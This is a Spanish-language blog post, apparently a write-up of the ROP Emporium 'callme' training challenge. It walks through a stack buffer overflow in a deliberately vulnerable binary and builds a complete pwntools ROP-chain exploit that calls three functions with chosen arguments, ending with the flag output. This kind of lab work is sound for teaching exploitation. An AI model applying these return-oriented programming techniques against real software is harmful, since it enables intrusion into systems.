---
layout: post
title: ROP emporium callme - Llamando multiples funciones 
author: c4rta
date: 2023-04-24
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, ROP]
image: /assets/img/callme/waifu.jpg
---
Para resolver este desafio usaremos ROP para llamar multiples funciones con multiples argumentos en el orden correcto
{:.lead}

## Analisis

![](/assets/img/callme/1.png)

No tiene canary, PIE, pero tiene NX, asi que no podemos ejecutar codigo en el stack.

Al ver la funcion main, lo unico interesante es el llamado a la funcion ```pwnme```

![](/assets/img/callme/2.png)

Una vez en esa funcion, podemos ver la vulnerabilidad:

![](/assets/img/callme/3.png)

Vemos que esta intentando escribir ```0x200``` bytes (512 en decimal) de la entrada estandar (stdin), dado un buffer, pero... Te voy a demostrar por que es vulnerable.

Cuando se hace el llamado a ```read()```, se hace con esta estructura:

```c
ssize_t read(int fd, void *buf, size_t count);
```

El primer argumento ```fd```, se le conoce como ```file decriptor```, que en palabras simples, se usa para crear una entrada para un archivo, esa entrada se identifica con un numero unico

El segundo argumento es un puntero a un buffer, y este buffer se esta creando aca:

![](/assets/img/callme/4.png)

Podemos ver que se esta inicializando un buffer de ```0x20``` bytes (32 en decimal) con el nombre de ```buf```

El tercer argumento es la cantidad de bytes que va a escribir en ese buffer, que son ```0x200```.

Entonces representando la funcion con los valores, quedaria asi:

```c
ssize_t read(0, 32, 512);
```

Esta tratando de escribir ```512``` bytes en ```32```, y como no se esta limitando la cantidad de bytes ingresados, ese buffer de ```32``` bytes va a petar, es la clasica vulnerabilidad buffer overflow, por que se esta sobrepasando la cantidad del buffer, que son 32.

Al mostrar todas las funciones en radare, tenemos que existe una funcion que se llama ```usefulFunction```:

![](/assets/img/callme/5.png)

Al mostrar el codigo de la funcion:

![](/assets/img/callme/6.png)

Nos damos cuenta que esta llamando a las funciones ```callme_three```, ```callme_two``` y ```callme_one```, y se estan llamando con los argumentos ```rdi```, ```rsi``` y ```rdx```.

Como curiosidad, si intentamos mostrar el codigo de una funcion de esas, no vamos a poder, sale algo como esto:

![](/assets/img/callme/7.png)

Y eso es por que las funciones ```callme_three```, ```callme_two``` y ```callme_one``` se encuetran en PLT que se esta cargando dinamicamente de ```libcallme.so```, entonces para poder verlas, tenemos que ejecutar el binario, me ire a gdb y pondre un breakpoint en el ```ret``` de la funcion main:

```
0x0000000000400897 <+80>:	ret
```

Y ahora si ya podemos ver su codigo, y lo mas relevante es que cuando se hace un llamado a ```callme_one```, los argumentos que se le pasan los compara con:

- 0xdeadbeefdeadbeef
- 0xcafebabecafebabe
- 0xd00df00dd00df00d

![](/assets/img/callme/8.png)

(en ```callme_three``` y ```callme_two``` es lo mismo)

Asi que ahora sabemos que debemos de llamar a ```callme_three```, ```callme_two``` y ```callme_one``` con los valores con los que se comparan los registros ```rdi```, ```rsi``` y ```rdx```

## Crafteando el exploit

Para saber el desplazamiento para llegar al RIP, podemos generar una cadena con ```pattern create 100``` y pasaresela al programa, despues podemos hacer ```pattern offset $rbp```:

![](/assets/img/callme/9.png)

Y al sumarle 8 bytes, y nos da 40

Asi va esta ahora:


```python
from pwn import *

p = process("./callme")

padding = b"A" * 40

argumento_1 = p64(0xdeadbeefdeadbeef)
argumento_2 = p64(0xcafebabecafebabe)
argumento_3 = p64(0xd00df00dd00df00d)

```

Como tenemos que escribir en rdi, rsi y rdx, debemos que buscar un gadget que nos permita hacer eso, usare ROPgadget con el comando:

```
ROPgadget --binary callme | grep 'pop rdi ; pop rsi ; pop rdx ; ret'
```

Y este nos funciona: ```0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret```

Asi va el exploit:

```python
from pwn import *

p = process("./callme")

padding = b"A" * 40

argumento_1 = p64(0xdeadbeefdeadbeef)
argumento_2 = p64(0xcafebabecafebabe)
argumento_3 = p64(0xd00df00dd00df00d)

gadget = p64(0x000000000040093c)
```

Despues ocupamos las direcciones de callme_one y las demas, eso lo podemos hacer con el comando ```afl``` en radare:


```python
from pwn import *

p = process("./callme")

padding = b"A" * 40

argumento_1 = p64(0xdeadbeefdeadbeef)
argumento_2 = p64(0xcafebabecafebabe)
argumento_3 = p64(0xd00df00dd00df00d)

gadget = p64(0x000000000040093c)

callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)
```

Y por ultimo tenemos que mandar el payload en el orden correcto, primero el padding, luego el gadget, los valores de los argumentos y la funcion, asi queda el exploit completo

```python
from pwn import *

p = process("./callme")

padding = b"A" * 40

argumento_1 = p64(0xdeadbeefdeadbeef)
argumento_2 = p64(0xcafebabecafebabe)
argumento_3 = p64(0xd00df00dd00df00d)

gadget = p64(0x000000000040093c)

callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

args = argumento_1 + argumento_2 + argumento_3

payload = padding + gadget + args + callme_one
payload += gadget + args + callme_two
payload += gadget + args + callme_three

p.sendline(payload)
print(p.recvall().decode())
```

Y ya tenemos la flag

```
󰣇  c4rta /tmp/callme  python3 exploit.py
[+] Starting local process './callme': pid 15024
[+] Receiving all data: Done (172B)
[*] Process './callme' stopped with exit code 0 (pid 15024)
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

Eso ha sido todo, gracias por leer ❤
